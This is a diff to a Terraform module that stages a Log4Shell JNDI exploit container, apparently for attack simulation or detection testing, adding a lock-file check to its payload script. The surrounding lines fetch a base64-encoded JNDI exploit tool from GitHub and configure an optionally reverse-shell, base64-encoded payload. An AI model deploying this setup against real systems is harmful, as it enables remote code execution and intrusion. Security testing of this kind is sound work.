@@ -2,6 +2,7 @@ locals {
     attack_dir = "/jndiexploit"
     attack_script = "jndiexploit.sh"
     start_script = "delayed_start.sh"
+    lock_file = "/tmp/delay_log4shell.lock"
     jndiexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
     image = "openjdk:11"
     name = "jndiexploit"
@@ -11,8 +12,13 @@ locals {
     base64_log4shell_payload= var.reverse_shell == true ? var.payload : base64encode(
        var.payload
     )
-
     payload = <<-EOT
+    LOCKFILE="${ local.lock_file }"
+    if [ -e "$LOCKFILE" ]; then
+        echo "Another instance of the script is already running. Exiting..."
+        exit 1
+    else
+
     LOGFILE=/tmp/${var.tag}.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
@@ -65,6 +71,7 @@ locals {
     delayed_start              = base64encode(templatefile(
                                 "${path.module}/resources/${local.start_script}",
                                 {
+                                    lock_file = local.lock_file
                                     attack_delay = var.attack_delay
                                     attack_dir = local.attack_dir
                                     attack_script = local.attack_script
